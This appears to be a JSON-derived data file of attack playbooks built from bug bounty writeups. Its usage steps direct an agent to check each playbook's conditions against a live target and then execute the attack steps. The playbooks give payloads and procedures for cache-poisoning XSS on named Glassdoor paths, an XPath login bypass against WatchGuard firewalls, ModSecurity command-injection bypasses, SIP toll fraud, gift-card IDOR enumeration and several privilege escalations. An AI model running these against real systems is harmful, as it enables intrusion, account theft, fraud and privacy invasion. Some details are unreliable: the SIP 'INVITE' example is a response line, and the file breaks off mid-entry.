description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Caching the Un-cacheables - Abusing URL Parser Confusions (Web Cache Poisoning Technique)

tech_stack_fingerprints: HTML content contains script tags where URL parameters are reflected

trigger_conditions.when_to_apply: When a web application reflects URL parameters unsanitized within script tags on pages served by a caching proxy, and the caching proxy normalizes path traversal characters differently than the backend server.
prerequisites: The target application must use a caching server in front of the origin server.
URL parameters must be reflected unsanitized within JavaScript blocks.
The caching server and backend application must have different behaviors for normalizing path traversal sequences (e.g., '../').
applicability_signals: Endpoint reflects URL parameters within `<script>` tags.
Endpoints under `/Job/` or similar paths are observed to be un-cacheable by default.
Path traversal sequences (e.g., `/../`) affect the final resolved URL differently between the caching layer and the origin server.
skip_if: WAF blocks all attempts to inject closing script tags.
No discrepancy found in URL path normalization between cache and backend.
All relevant pages are successfully cached without manipulation.

recon_steps: Step 1: Identify endpoints that reflect URL parameters within JavaScript blocks. Test `/Job/?param=<script>alert(1)</script>` and observe if `alert(1)` is present in the response within a script tag.
Step 2: Test for cacheability of identified endpoints. Attempt to poison the cache with a simple payload and observe if subsequent requests for the canonical URL receive the poisoned response.

Step 3: Identify if path traversal characters (e.g., `/../`) are handled differently by the caching layer and the origin server. For example, send `GET /Job/../Award/resource?param=<script>alert(1)</script>` and compare the resolved URL at the cache layer versus the origin server response.
attack_steps: Step 1: Construct a request to the vulnerable endpoint using path traversal to trick the cache, including a payload to close the script tag and inject XSS. Example: `GET /Job/../Award/blah?xss=</script><script>alert(document.domain)</script>`

Step 2: Send the constructed request to the target. The caching server will resolve it to `/Award/blah`, while the backend will resolve it to `/Job/../Award/blah`. This difference causes the response with the injected XSS to be cached under the `/Award/blah` path.

Step 3: Visit the canonical URL (e.g., `https://www.glassdoor.com/Award/blah?xss=`) to trigger the cached XSS payload. The XSS payload will execute in the victim's browser when they visit the cached `Award/blah` page.
payloads_or_patterns: For Stored XSS on /mz-survey/interview/collectQuestions_input.htm: https://glassdoor.com/mz-survey/interview/collectQuestions_input.htm/../../../Award/blah with XSS payloads in headers/cookies.
tools_recommended: Burp Suite: To intercept and modify requests, observe cache behavior, and craft payloads.
Browser Developer Tools: To analyze reflected parameters and script execution.
success_indicators: The `alert(document.domain)` box appears when visiting the canonical cacheable URL (e.g., `https://www.glassdoor.com/Award/blah?xss=`).
The response served for the canonical URL contains the injected XSS payload.
For stored XSS, subsequent requests to the poisoned endpoint reveal the injected malicious content.
failure_indicators: The WAF blocks the request or returns a generic error.
No XSS payload is reflected in the response.
The cache is not poisoned; canonical URL requests do not serve the manipulated response.
The path traversal does not result in a cache/backend resolution discrepancy.

playbooks.impact: Execution of arbitrary JavaScript in the victim's browser when they access the poisoned cache entry. This can lead to session hijacking, credential theft, defacement, or further exploitation depending on the executed JavaScript.
playbooks.key_lesson: Test for web cache poisoning by exploiting discrepancies in URL parsing and path normalization between caching proxies and backend web servers, especially when parameters are reflected unsanitized within script tags.

meta.title: Viewing Instagram live streams anonymously without notifying the host

trigger_conditions.when_to_apply: When an attacker can intercept and modify HTTP requests made by the Instagram mobile app, specifically targeting the heartbeat endpoint for live streams.
prerequisites: Attacker has two Instagram accounts: Victim and Attacker.
Victim and Attacker can message each other.
Attacker can proxy and modify HTTP requests from the Attacker's Instagram app.
applicability_signals: The existence of the /api/v1/live/[broadcast_id]/heartbeat_and_get_viewer_count/ endpoint in network traffic.
The target allows viewing live streams after being messaged the stream link.
skip_if: The heartbeat endpoint is not present or consistently returns valid data without modification.
The Instagram app does not allow proxying or modifying requests.

recon_steps: Step 1: Set up two Instagram accounts (Victim and Attacker). Ensure they can message each other.
Step 2: Have the Victim start a live stream, setting the audience to 'Practice' or a similar private mode.
Step 3: Have the Victim share the live stream link with the Attacker.
Step 4: Configure Burp Suite or a similar proxy to intercept and log traffic from the Attacker's Instagram app.
Step 5: Observe network requests made by the Attacker's app when joining the live stream. Identify the /api/v1/live/[broadcast_id]/heartbeat_and_get_viewer_count/ endpoint.
attack_steps: Step 1: In Burp Suite, navigate to Proxy -> Options and set up a new 'Match and replace' rule.
Step 2: Configure the rule to target 'Request header' or 'Request body' (depending on how the endpoint receives data).
Step 3: Set 'match' to 'heartbeat_and_get_viewer_count/'.
Step 4: Set 'replace' to 'heartbeat_and_get_viewer_counts/' or any string that makes the original endpoint path invalid for processing.
Step 5: Ensure the rule is enabled and active.
Step 6: Have the Attacker join the live stream by clicking the link sent by the Victim.
Step 7: Continue watching the live stream.
tools_recommended: Burp Suite: Use the 'Match and replace' feature to modify the request path.
Charles Proxy or mitmproxy: Alternative tools for intercepting and modifying HTTP traffic.
success_indicators: The Attacker can view the live stream.
The Victim does not see the Attacker in the viewer list.
The viewer count on the Victim's stream does not increase due to the Attacker's presence.
When the Victim checks the list of viewers (e.g., by clicking their username), the Attacker is not listed.
failure_indicators: The Attacker receives an error when joining the stream, or the stream does not load: indicates the modification might be too broad or the endpoint is critical for stream establishment.
The Victim sees the Attacker in the viewer list: indicates the rule did not effectively block the heartbeat request or the notification mechanism is different.
The viewer count increases for the Attacker: indicates the heartbeat request was still processed.

playbooks.impact: An attacker can anonymously view live streams without the host's knowledge or ability to remove them. This poses a significant privacy risk, especially in private 'practice' streams or when sensitive conversations are expected among a small group of known participants.
playbooks.key_lesson: When analyzing live streaming features, investigate if viewer notification and count mechanisms can be bypassed by manipulating heartbeat or status update requests.

meta.title: Google & Apache Found Vulnerable to GitHub Environment Injection

tech_stack_fingerprints: Usage of GitHub Actions for CI/CD

trigger_conditions.when_to_apply: When a GitHub Actions workflow has been identified that processes user-controlled input in a way that can influence environment variables. This is particularly relevant if the workflow interacts with secrets or sensitive configuration settings.
prerequisites: Attacker can influence input processed by a GitHub Actions workflow.
The workflow does not properly sanitize or validate user-controlled input before using it to construct environment variables.
applicability_signals: Workflow definition files (.yml) that accept or process external input.
Workflows that set environment variables based on dynamic content.
Usage of secrets within GitHub Actions workflows that could be manipulated.
skip_if: All user-controlled input is strictly validated and sanitized before being used to set environment variables.
Workflows do not utilize environment variables derived from external input.

recon_steps: Identify GitHub Actions workflows within a target repository.
Analyze workflow definition files (.yml) for steps that process user-controlled input and subsequently set environment variables.
attack_steps: Step 1: Craft malicious input that, when processed by the vulnerable workflow, injects arbitrary values into environment variables.
Step 2: Trigger the GitHub Actions workflow with the crafted malicious input.
Step 3: Observe if the injected values in the environment variables lead to unintended actions or data leakage, such as accessing secrets or executing arbitrary commands.
payloads_or_patterns: Payloads would involve injecting characters or strings that manipulate how environment variables are parsed or interpreted. For example, if a workflow concatenates strings to form an environment variable, injecting a separator character could lead to a different, unintended variable being set. A specific example would depend on the exact workflow logic, but could involve strings like `'; malicious_command; #'` or manipulating variable expansion in shell commands.
tools_recommended: Manual code review of GitHub Actions workflow files
Custom scripts to fuzz workflow inputs
success_indicators: The workflow executes unintended commands.
Sensitive information (secrets) is leaked or accessed inappropriately.
Unexpected behavior or outputs from the workflow run.
failure_indicators: Workflow fails to execute or completes without any unintended consequences. This might indicate proper input sanitization or that the injected values did not affect critical parts of the workflow. In such cases, pivot to analyzing different workflow inputs or other potential injection points.
GitHub Actions security features block the execution of malicious commands.

playbooks.impact: Arbitrary code execution within the GitHub Actions runner environment, leading to potential compromise of build artifacts, access to secrets, and further privilege escalation within the CI/CD pipeline.
playbooks.key_lesson: Always validate and sanitize all user-controlled inputs used to construct environment variables within CI/CD pipelines, especially when those variables are used in sensitive operations or command execution.

meta.title: Azure Synapse: Local Privilege Escalation Vulnerability in Spark

affected_components: Apache Spark pool (specifically 'systemreservedpool-dataflow' when debugging Data flows)

trigger_conditions.when_to_apply: When an attacker can execute code within an Azure Synapse Apache Spark pool, specifically one used for debugging Data flows, and can identify a script that can be run as root with NOPASSWD.
prerequisites: Ability to run code within a Spark pool in Azure Synapse.
The Spark pool must be of the type used for debugging 'Data flows' (e.g., 'systemreservedpool-dataflow').
applicability_signals: A Spark job executing with the user 'trusted-service-user'.
The output of 'sudo -l' showing that 'trusted-service-user' can execute '/usr/lib/notebookutils/bin/filesharemount.sh' as root without a password.
skip_if: The 'filesharemount.sh' script is not executable by 'trusted-service-user' via 'sudo -l NOPASSWD'.
The target system does not run Azure Synapse Analytics or a similar Spark-based analytics service.

recon_steps: Step 1: Initiate a Python reverse shell within an Azure Synapse Spark pool that is configured for debugging 'Data flows'.
Step 2: On the compromised VM, execute 'whoami' to confirm the user is 'trusted-service-user'.
Step 3: Execute 'sudo -l' to list commands that can be run as root and identify if '/usr/lib/notebookutils/bin/filesharemount.sh' is in the list with NOPASSWD.
attack_steps: Step 1: If 'sudo -l' confirms the executable script, craft an input to the 'filesharemount.sh' script that exploits the race condition to gain root privileges. The writeup implies a race condition related to mounting/unmounting directories.
Step 2: Execute the crafted command using 'sudo /usr/lib/notebookutils/bin/filesharemount.sh <crafted_arguments>'.
Step 3: Confirm root access by executing a command like 'sudo id' or 'sudo whoami'.
payloads_or_patterns: Insufficient detail in writeup (The exact exploit payload for the race condition is not provided, only the vulnerable script path and its general purpose.)
tools_recommended: Python (for reverse shell)
SSH/Telnet (if reverse shell connects to a listener)
Standard Linux utilities (whoami, sudo -l)
success_indicators: Executing 'sudo id' returns uid=0(root) gid=0(root).
Ability to execute arbitrary commands as root (e.g., 'sudo cat /etc/passwd').
failure_indicators: `sudo -l` does not show the script is executable as root without password: Continue reconnaissance for other misconfigurations or vulnerabilities.

The exploit payload for `filesharemount.sh` fails to grant root access: Further investigation into the script's logic and the exact nature of the race condition is required. The writeup mentions crossing paths with another researcher, suggesting prior attempts might exist.
Initial reverse shell fails to establish: Verify Spark pool configuration and network connectivity.

playbooks.impact: An attacker can escalate from a low-privileged 'trusted-service-user' to 'root' on the underlying VM hosting the Azure Synapse Spark pool, allowing for complete compromise of the Spark environment and potential access to sensitive data processed by Synapse.
playbooks.key_lesson: When investigating Spark environments in cloud platforms, always examine scripts that are permitted to run as root via NOPASSWD, as these can be targets for privilege escalation, especially if they involve file operations or race conditions.

meta.title: SETTLERS OF NETLINK: Exploiting a limited UAF in nf_tables (CVE-2022-32250)

trigger_conditions.when_to_apply: This vulnerability can be exploited when an attacker has local user access to a Linux system running a vulnerable kernel version.
prerequisites: Local user access to the target system.
The system must be running a vulnerable version of the Linux kernel.
applicability_signals: The presence of the `nf_tables` module.
Ability to create and manipulate netfilter rules via `nft` command-line utility.
skip_if: The Linux kernel version is patched against CVE-2022-32250.
Attacker does not have local user access.

recon_steps: Step 1: Identify the Linux kernel version on the target system using `uname -a`.
Step 2: Cross-reference the kernel version with known vulnerable versions for CVE-2022-32250.
Step 3: Verify that the `nf_tables` module is loaded and accessible.
attack_steps: Step 1: Create a specific set of `nftables` rules that trigger the use-after-free condition in the `nf_tables` subsystem.
Step 2: Trigger the race condition by interacting with the created `nftables` rules in a specific sequence.
Step 3: Leverage the use-after-free vulnerability to achieve arbitrary kernel memory read/write.
Step 4: Utilize the kernel memory read/write primitives to gain root privileges (e.g., by overwriting critical kernel structures or executing arbitrary code in kernel mode).
tools_recommended: nft (netfilter tools) for manipulating netfilter rules
Custom exploit C code for triggering the UAF and escalating privileges
success_indicators: The attacker's user ID changes from a normal user to root (UID 0).
The attacker can execute commands with root privileges.
Kernel panic or system crash (indicates an attempt was made, but success is not guaranteed).
failure_indicators: No change in user privileges after executing the exploit steps.
System instability or crash without achieving privilege escalation.
`nft` commands fail to execute or `nftables` rules cannot be created/manipulated as expected, indicating system protection or patching.

playbooks.impact: Arbitrary code execution in kernel mode, leading to full system compromise and privilege escalation to root.
playbooks.key_lesson: When analyzing Linux kernel vulnerabilities, especially memory corruption bugs in subsystems like netfilter, always attempt to trigger race conditions that can lead to use-after-free exploits for privilege escalation.

meta.title: Abusing Microsoft Teams Direct Routing

target_profile.technology: Microsoft Teams Direct Routing (specifically AudioCodes SBCs)
affected_components: Session Border Controller (SBC) configuration for Direct Routing

trigger_conditions.when_to_apply: When a Microsoft Teams Direct Routing is implemented using an SBC (like AudioCodes) that has specific, unauthenticated classification rules for incoming SIP messages.
prerequisites: Target is using Microsoft Teams Direct Routing.
Attacker can send unauthenticated SIP messages to the target's SBC.
applicability_signals: SBC's FQDN is used as the destination host in SIP messages.
The string 'pstnhub.microsoft.com' is present in the 'Contact' header of SIP messages.
No further authentication or complex conditions are required for SIP message classification.
skip_if: SBC requires authentication for SIP messages.
SBC has stricter, more complex classification rules that cannot be easily spoofed.

recon_steps: Step 1: Identify if the target is using Microsoft Teams Direct Routing by observing network traffic or public documentation.
Step 2: Determine the SBC device in use (e.g., AudioCodes) and research its default or recommended configurations for Direct Routing.
attack_steps: Step 1: Craft a malicious SIP INVITE message.
Step 2: Set the Request-URI's host part to the target SBC's FQDN.
Step 3: Set the 'Contact' header's host part to 'pstnhub.microsoft.com'.
Step 4: Send the crafted SIP INVITE message to the target SBC's SIP signaling port.
Step 5: Monitor for unauthorized outbound calls originating from the target's phone line.
payloads_or_patterns:
SIP INVITE message with modified Request-URI and Contact header, e.g.:

SIP/2.0 200 OK
Via: SIP/2.0/UDP <TARGET_SBC_FQDN>;branch=...
From: <sip:attacker@attacker.com>
To: <sip:victim@<TARGET_SBC_FQDN>>
Call-ID: 1234567890@attacker.com
CSeq: 1 INVITE
Contact: <sip:user@pstnhub.microsoft.com>
Content-Type: application/sdp

(Payload details for the actual call setup would follow)
tools_recommended: SIPp for crafting and sending custom SIP messages.
Wireshark for network traffic analysis and SIP message inspection.
success_indicators: The target SBC establishes an outbound call to an external number, originating from the victim's phone line.
Billing records show unauthorized calls made through the victim's telephony service.
failure_indicators: SIP messages are rejected with an authentication error (401 Unauthorized) or other client errors (4xx). Suggestion: Investigate SBC configurations for alternative spoofing vectors or other vulnerabilities.
SIP messages are rejected with server errors (5xx) or dropped without response. Suggestion: Verify network reachability and firewall rules, or attempt different SIP message types.

playbooks.impact: An unauthenticated attacker can initiate unauthorized outbound calls through the victim's phone line, leading to toll fraud and financial losses for the victim organization. This can also be used for malicious activities masked as legitimate calls.
playbooks.key_lesson: Verify that all incoming SIP messages to the SBC are strictly authenticated and validated against their source, especially when integrating with external services like Microsoft Teams Direct Routing.

meta.title: Vulnerability in TikTok Android app could lead to one-click account hijacking

tech_stack_fingerprints: TikTok Android App package name: com.ss.android.ugc.trill (for East and Southeast Asia)

trigger_conditions.when_to_apply: When the TikTok Android app's deeplink verification mechanism can be bypassed, allowing an attacker to load an arbitrary URL into the app's WebView.
prerequisites: Target is using the TikTok Android application.
applicability_signals: Ability to craft a special link that triggers deeplink handling in the TikTok app.
The TikTok app loads arbitrary URLs within its WebView component.
skip_if: The deeplink handling is properly validated and does not allow arbitrary URL loading.
The WebView component does not expose JavaScript bridges or they are secured against unauthorized access.

recon_steps: Step 1: Identify how TikTok handles external links and deeplinks on the Android app. Look for custom URL schemes or intents.
Step 2: Investigate the implementation of WebView components within the TikTok app to understand their configuration and exposed JavaScript bridges.
attack_steps: Step 1: Craft a malicious URL that exploits the deeplink verification bypass. This URL should aim to load an arbitrary website within the TikTok app's WebView.
Step 2: If successful, the attacker-controlled website loaded in the WebView can leverage exposed JavaScript bridges to interact with the TikTok app's functionalities.
Step 3: Use the JavaScript bridges to perform actions on behalf of the user, such as accessing sensitive information, modifying profile data, or posting content.
payloads_or_patterns: Specially crafted URL designed to bypass deeplink verification and load an arbitrary URL into the WebView. The exact payload structure would depend on the specific bypass discovered.
tools_recommended: Burp Suite: To intercept and analyze network traffic, craft malicious URLs, and test WebView interactions.
Android debugging tools (e.g., ADB, Frida): To inspect app components, JavaScript bridges, and deeplink handling.
success_indicators: The app loads an attacker-controlled URL in its WebView.
JavaScript code running in the WebView can successfully execute TikTok app functions (e.g., retrieve user data, post messages, upload videos).
User's account is hijacked, and actions are performed without their explicit consent.
failure_indicators: The crafted link does not trigger the expected deeplink handling or opens a standard browser.
The WebView loads the attacker's URL but cannot interact with the app's JavaScript bridges, or interactions are limited to benign functions.
Attempted actions on the user's account fail to execute or are blocked by the app's security measures.

playbooks.impact: Account hijacking leading to unauthorized access and modification of user profiles, private videos, messages, and the ability to post content on behalf of the user.
playbooks.key_lesson: Always scrutinize deeplink handling and WebView implementations in mobile applications for vulnerabilities that could allow arbitrary URL loading and exploitation of JavaScript bridges.

meta.title: CVE-2022-26113: FortiClient Arbitrary File Write As SYSTEM

trigger_conditions.when_to_apply: When FortiClient VPN is installed and a user can interact with the application's UI, particularly the configuration backup feature.
prerequisites: FortiClient installed on a Windows machine.
User can access and interact with the FortiClient GUI.
applicability_signals: FortiClient GUI displays a 'backup configuration' option.
The configuration backup path is not strictly validated at the OS level for write permissions.
The FortiClient service runs with SYSTEM privileges.
skip_if: FortiClient is not installed.
The user has no access to the FortiClient GUI.
The configuration backup feature is disabled or not present.

recon_steps: Step 1: Verify FortiClient installation and version on the target Windows system.
Step 2: Inspect the FortiClient application directory for executables like FCConfig.exe.
attack_steps: Step 1: Launch FortiClient with Electron debugging enabled: C:\Program Files\Fortinet\FortiClient\FortiClient.exe --remote-debugging-port=9222
Step 2: Open Chrome and navigate to chrome://inspect to attach to the FortiClient process debugger.
Step 3: In the JavaScript console, identify and locate the UI element responsible for the backup file path input.
Step 4: Use JavaScript to set the 'disabled' property of the backup file path input element to 'false', allowing modification.
Step 5: Modify the backup file path to an arbitrary, attacker-controlled location (e.g., a startup directory for a privileged user) with a script payload (e.g., .bat file).
Step 6: Trigger the configuration backup operation through the FortiClient UI.
Step 7: Wait for the privileged user to log in, executing the dropped script.
tools_recommended: Google Chrome (for debugging)
Built-in Windows debugger (if applicable)
Text editor for creating batch scripts
success_indicators: The batch script is successfully written to the specified arbitrary file path.
The batch script executes with SYSTEM privileges upon a privileged user's login.
Observable changes on the system as a result of the script execution (e.g., creation of new files, network connections, privilege escalation).
failure_indicators: The debugger cannot attach to the FortiClient process, or the --remote-debugging-port flag has no effect (suggests a different version or configuration).
The backup operation fails with a file write permission error (suggests file path validation is not completely bypassed).
The script is not executed upon user login (suggests incorrect startup directory or execution context).

playbooks.impact: Arbitrary file write as SYSTEM, enabling privilege escalation by dropping and executing malicious scripts in privileged user startup directories.
playbooks.key_lesson: When a service runs as SYSTEM, any file write functionality that is not strictly validated can lead to arbitrary file writes and privilege escalation. Inspect the UI and underlying code for such functionalities.

meta.title: Exploiting Improper Validation of Amazon Simple Notification Service SigningCertUrl

affected_components: HTTP/S subscribers that validate message authenticity using SigningCertURL
tech_stack_fingerprints: HTTP headers: x-amz-sns-message-type, x-amz-sns-message-id, x-amz-sns-topic-arn, x-amz-sns-subscription-arn
SNS message JSON body containing 'Signature' and 'SigningCertURL' fields

trigger_conditions.when_to_apply: When an application relies on Amazon SNS for communication and validates incoming messages using the 'Signature' and 'SigningCertURL' fields provided in the SNS message payload.
prerequisites: The target application subscribes to an SNS topic via HTTP/S.
The target application attempts to verify the authenticity of incoming SNS messages.
applicability_signals: Incoming HTTP POST requests with SNS-specific headers (x-amz-sns-message-type, x-amz-sns-message-id, etc.).
The presence of 'Signature' and 'SigningCertURL' fields in the JSON payload of incoming messages.
The target application's source code or documentation shows implementation of SNS message signature verification.
skip_if: The target application does not use SNS for incoming webhooks/callbacks.
The target application does not implement signature verification for SNS messages.
The target application uses a different method for verifying SNS message authenticity (e.g., only checking the origin IP, which is not a reliable method).

recon_steps: Step 1: Identify applications that subscribe to SNS topics via HTTP/S endpoints. This might be discoverable through public bug bounty programs, security advisories, or by observing network traffic if possible.

Step 2: Examine the incoming HTTP POST requests to the target endpoint. Look for the presence of specific AWS SNS headers (e.g., 'x-amz-sns-message-type', 'x-amz-sns-message-id', 'x-amz-sns-topic-arn', 'x-amz-sns-subscription-arn').
Step 3: Inspect the JSON payload of these requests for fields like 'Signature' and 'SigningCertURL'.
attack_steps: Step 1: Craft a malicious SNS notification message. The core idea is to manipulate the 'SigningCertURL' to point to a certificate controlled by the attacker.
Step 2: Obtain a certificate and its corresponding private key. The private key is crucial for signing the crafted message.
Step 3: Construct a new JSON payload for the SNS message, including the attacker-controlled 'SigningCertURL'. The 'Message' field can contain arbitrary data.
Step 4: Sign the canonicalized message (excluding 'Signature' and 'SigningCertURL' themselves) using the attacker's private key and base64 encode the signature.
Step 5: Send the crafted malicious SNS message to the target application's HTTP endpoint.

Step 6: The target application will receive the message, download the certificate from the attacker's provided 'SigningCertURL', and attempt to verify the signature. If the validation is improper (e.g., the SDK doesn't strictly validate that the certificate was issued by AWS or for the correct service), the forged message will be accepted as authentic.

payloads_or_patterns.description: Example malicious SNS message structure. The attacker needs to control the signing key and certificate.

tools_recommended: Custom Python/Go script: To generate certificates, sign messages, and send crafted HTTP POST requests.
Burp Suite: To intercept and analyze incoming SNS messages, and potentially to host the malicious 'SigningCertURL'.
success_indicators: The target application processes the forged message as if it were legitimate (e.g., performing an action based on the attacker-controlled 'Message' field).
The application's logs show that the message signature was successfully validated, even though it was forged.
failure_indicators: The target application rejects the message with an error indicating signature verification failure (e.g., 400 Bad Request, custom error message). This might happen if the target application uses a more robust validation mechanism or the AWS SDK itself has safeguards.
The 'SigningCertURL' is blocked or unreachable. Pivot: Try using legitimate AWS domains with compromised certificates if possible, or investigate other signature validation weaknesses.

playbooks.impact: An attacker can forge SNS messages, leading to unauthorized actions being performed by the target application. This could include data exfiltration, unauthorized API calls, account manipulation, or triggering unintended workflows, depending on the application's functionality.
playbooks.key_lesson: Always ensure that certificate-based signature validation not only checks the signature itself but also verifies the issuer and validity of the certificate, and that it originates from a trusted authority for the specific service.

meta.title: Bypassing ModSecurity for RCEs

trigger_conditions.when_to_apply: When ModSecurity is in place and blocking common RCE payloads, and the application allows interaction with the filesystem or command execution.
prerequisites: Application vulnerable to command injection or file access that is being filtered by ModSecurity.
Application running on a Linux/Unix or Windows system.
applicability_signals: Target system exhibits behavior consistent with ModSecurity filtering (e.g., common RCE payloads are blocked).
Application features that involve file manipulation or command execution are present.
skip_if: Target application does not allow for command execution or file system interaction.
ModSecurity rules are exceptionally strict and block even these advanced bypass techniques.

recon_steps: Step 1: Identify if ModSecurity is present by sending various common attack vectors and observing WAF responses (e.g., 403 Forbidden).
Step 2: Map out application functionalities that interact with the filesystem or execute commands.
attack_steps: Step 1 (Linux - Filename Character Classes): Attempt to execute commands by using character classes in filenames, e.g., `cat /etc/pass[w]d` or `cat /etc/pass[!x]d`.
Step 2 (Linux - Command Pathing): Execute commands using their full path, potentially bypassing rules that look for just the command name, e.g., `/usr/bin/who[a]mi`.

Step 3 (Linux - Base64 Encoding with printf and sh): Encode the desired command in base64, pipe it to `base64 -d`, and then pipe the decoded output to `sh`. Example: `printf <BASE64_ENCODED_COMMAND> | base64 -d | sh`.
Step 4 (Windows - Path Wildcards): Attempt to bypass ModSecurity by using wildcard characters in Windows file paths, e.g., `C:\Windows\System32\WindowsPowerShell\v1.0\power?hell.exe`.
tools_recommended: Burp Suite (for intercepting and modifying requests)
Custom scripts for base64 encoding and payload generation
success_indicators: Execution of arbitrary commands on the server (e.g., retrieving `/etc/passwd` content, output of `whoami`).
Successful execution of PowerShell scripts on Windows.
failure_indicators: 403 Forbidden response from ModSecurity after attempting bypass.
Commands do not execute or produce unexpected output, indicating the bypass was not successful or the application is not vulnerable to command execution.

playbooks.impact: Remote Code Execution (RCE) allowing an attacker to compromise the server, access sensitive data, install malware, or pivot to other systems.
playbooks.key_lesson: Leverage system-specific features like filename character classes, path wildcards, and encoding techniques to bypass WAF filtering on command execution and file access.

meta.title: Blind Exploits To Rule Watchguard Firewalls

trigger_conditions.when_to_apply: When the administration interface of a WatchGuard firewall is accessible and exposed on the internet, and the `wgagent` binary is used for handling XML-RPC requests, particularly for the `/agent/login` endpoint.
prerequisites: Administrative interface accessible on ports 8080 or 4117.
The `wgagent` binary is running and handles XML-RPC requests.
applicability_signals: Existence of the `/agent/login` endpoint.
XML-RPC requests are being sent to `/agent/login`.
The authentication structure contains `user`, `password`, `domain`, and `uitype` fields.
skip_if: The administrative interface is not exposed.
The `wgagent` binary does not process XML-RPC requests for login.
A WAF or IPS blocks XML-RPC requests or specific payloads.

recon_steps: Step 1: Scan target IPs for open ports 8080 and 4117 to identify administrative interfaces.
Step 2: Send a basic XML-RPC request to the `/agent/login` endpoint on the identified ports to confirm the presence of the `wgagent` service and its expected XML structure.
attack_steps: Step 1: Craft an XML-RPC login request to `/agent/login` with a valid `user` (e.g., 'admin') and `password` (e.g., 'readwrite').

Step 2: Modify the XML structure by injecting XPath expressions into the parameter values (e.g., in the `user` or `password` field) to test for XPath injection vulnerabilities. Example: `user` = `admin' or 1=1 or 'a'='a`.

Step 3: Analyze the response for differences in status codes, response times, or content that indicate the XPath injection was successful (e.g., a successful login attempt despite invalid credentials, or a different error message).

Step 4: If initial XPath injection is successful, develop more sophisticated payloads to extract sensitive information or achieve code execution. The writeup mentions exploiting this to get an unpatched pre-authentication remote root 0-day, implying further exploitation steps beyond simple injection.
payloads_or_patterns:
POST /agent/login HTTP/1.1
Content-Type: text/xml

<methodCall>
  <methodName>login</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>password</name>
            <value><string>readwrite' or 1=1 or 'a'='a</string></value>
          </member>
          <member>
            <name>user</name>
            <value><string>admin</string></value>
          </member>
          <member>
            <name>domain</name>
            <value><string>Firebox-DB</string></value>
          </member>
          <member>
            <name>uitype</name>
            <value><string>2</string></value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
tools_recommended: Burp Suite: Repeater to manually craft and send XML-RPC requests, Intruder for fuzzing XPath payloads.
Custom Python script: To automate the process of sending various XPath payloads and analyzing responses.
success_indicators: Receiving a successful login response (e.g., 200 OK with a session token) when using a malformed XPath injection payload that should have failed authentication.
Noticeable delays or different error messages that indicate the XML parser is evaluating the injected XPath expression.
The ability to leverage the initial XPath injection to achieve further exploitation, as described in the writeup (e.g., obtaining remote root).
failure_indicators: Consistently receiving authentication failures (e.g., 401 Unauthorized or specific error messages) for all tested XPath injection payloads.
No discernible difference in response times or content for different injected payloads.
A WAF or IPS blocking the requests outright with a 403 Forbidden status code.

playbooks.impact: Authentication bypass, leading to pre-authentication remote code execution with root privileges on the WatchGuard firewall. This could allow an attacker to gain full control of the network perimeter device, intercept or redirect traffic, deploy malware (like Cyclops Blink), and pivot to internal networks.
playbooks.key_lesson: Always test XML/XML-RPC parsers for injection vulnerabilities, especially when handling user-supplied data in sensitive operations like authentication, by fuzzing parameters with constructs like XPath expressions.

meta.title: The Million Dollar IDOR

affected_components: /graphql endpoint, specifically queries related to user stipends (gift cards)
tech_stack_fingerprints: API endpoint commonly used for GraphQL: /graphql
Requests with 'query' and 'mutation' in the body

trigger_conditions.when_to_apply: When an authenticated user can access their gift card details via a GraphQL API, and the API uses sequential and guessable IDs for individual gift cards.
prerequisites: Attacker must have an authenticated session on the target website.
applicability_signals: GraphQL API endpoint is identified.
API requests for gift card details contain an `id` parameter.
The `id` parameter in gift card queries is observed to be a simple integer that appears to be sequential and guessable (e.g., 45, 46, 47).
skip_if: API responses for different gift card IDs always return a 404 or indicate that the requested resource does not belong to the authenticated user.
API responses are heavily rate-limited, preventing rapid ID enumeration.

recon_steps: Step 1: Identify the GraphQL endpoint (commonly /graphql) by observing network requests after login.

Step 2: Intercept requests made when viewing gift card details. Analyze the structure of these requests and identify the query and the parameters used, specifically looking for an `id` parameter associated with a gift card.
attack_steps: Step 1: Log in to the application with a regular user account.
Step 2: Navigate to the section displaying the user's gift cards.
Step 3: Intercept the GraphQL request made when viewing a specific gift card's details (e.g., using Burp Suite or OWASP ZAP).
Step 4: Modify the `id` parameter in the intercepted request to a different, sequentially adjacent or easily guessable integer value (e.g., if the current ID is 46, try 45 or 47).
Step 5: Send the modified request to the server.
Step 6: Observe the response. If the response contains details of a different user's gift card, repeat the process with other guessed IDs.
tools_recommended: Burp Suite or OWASP ZAP: To intercept, analyze, and modify HTTP requests.
Browser Developer Tools (Network Tab): For initial observation of API requests.
success_indicators: The API response returns detailed information (card number, CVV, expiry, amount, cardholder name) for a gift card that does not belong to the authenticated user whose session is being used.
failure_indicators: The API returns a 404 Not Found, a 403 Forbidden, or a generic error message indicating the resource is inaccessible or invalid for the current user. Pivot: If IDs are not sequential, try enumerating based on UUID patterns or other less predictable formats if they appear in other parts of the application.

playbooks.impact: Disclosure of sensitive gift card details (card number, CVV, expiry date, current balance, cardholder name) for potentially thousands of users, enabling unauthorized redemption and financial loss.
playbooks.key_lesson: Always test numerically guessable ID parameters in API requests, especially within GraphQL schemas, by substituting IDs associated with other authenticated users to check for IDOR vulnerabilities.

meta.title: Tetsuji: Remote Code Execution on a GameBoy Colour 22 Years Later

target_profile.technology: GameBoy Colour with Mobile Adapter GB and Pokemon Crystal
tech_stack_fingerprints: BGB emulator (for testing, not the target itself)

trigger_conditions.when_to_apply: When a GameBoy Colour with the Mobile Adapter GB accessory and Pokemon Crystal is reachable, and the protocol commands can be manipulated.
prerequisites: Access to a GameBoy Colour with the Mobile Adapter GB.
Pokemon Crystal game installed.
The Mobile Adapter GB configured for internet connectivity (e.g., dial-up credentials).
applicability_signals: Observable network traffic from the Mobile Adapter GB.
The ability to interact with the Mobile Adapter GB protocol commands.
skip_if: No Mobile Adapter GB available.
The game is not Pokemon Crystal.
The target system does not respond to or process Mobile Adapter GB protocol commands.

